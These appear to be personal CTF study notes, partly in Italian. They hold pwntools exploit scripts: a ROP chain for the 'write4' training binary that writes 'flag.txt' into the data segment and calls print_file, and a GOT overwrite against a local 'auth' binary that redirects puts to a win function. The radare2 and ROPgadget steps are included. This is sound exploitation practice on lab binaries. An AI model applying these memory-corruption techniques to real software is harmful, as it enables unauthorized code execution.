######## example file: 3_write4 ########


#instructions:

#radare2 ./nome_file
#aaaa
#afl
#pdf @ useful_function //non print_file
#iS 

#cerca "data", controlla che sia r/w e prendi size (esempio: 0x10 per eseguire il prossimo comando) 

#px 10 //segnati l'indirizzo

#ROPgadget --binary ./a.out | grep “istruzione” //es: "mov" in questo caso
#We find           mov ptr [r14], r15,             that puts what’s into r15 at the address pointed by r14 (0x00400628) 

#ROPgadget --binary ./a.out | grep “pop” 
#Let’s find them with ROPgadget:                                          0x0000000000400690 : pop r14 ; pop r15 ; ret

#ROPgadget --binary ./a.out | grep “rdi” 
#Last, we need the gadget to put the address of the string into rdi:      0x0000000000400693 : pop rdi ; ret


#We have everything to build our chain:

from pwn import *

data_seg = 0x00601028  #indirizzo px 10

print_file = 0x400510   #quello di print_file con l'istruzione asl

# RIP offset is at 40
rop = b"A" * 40    # questo non si capisce dove venga fuori

# First gadget to initialize r14 and r15
pop_r14_r15 = 0x0000000000400690 # pop r14 ; pop r15 ; ret
rop += p64(pop_r14_r15)
rop += p64(data_seg)
rop += b"flag.txt"
#write to memory
mov_r15_to_r14 = 0x0000000000400628 # mov qword ptr [r14], r15 ; ret
rop += p64(mov_r15_to_r14)
# Call print_file
pop_rdi = 0x0000000000400693 # pop rdi ; ret
rop += p64(pop_rdi)
rop += p64(data_seg)
rop += p64(print_file)
# Start process and send rop chain
e = process('write4')
e.sendline(rop)
e.interactive()



######## example file: 1_GOT ########

#instructions:

#radare2 ./nome_file
#aaaa
#afl
#pdf @ sym.imp.puts //cerca sempre puts 

#segnati l'indirizzo sia di sym.imp.puts che di sym.win

#We have everything to build our chain:

from pwn import *

putsGOT = '0804a00c'
winAddr = '0804854b'

io = process('./auth’)

io.sendlineafter('?\n', putsGOT)
io.sendlineafter('\n', winAddr)

io.interactive()


             
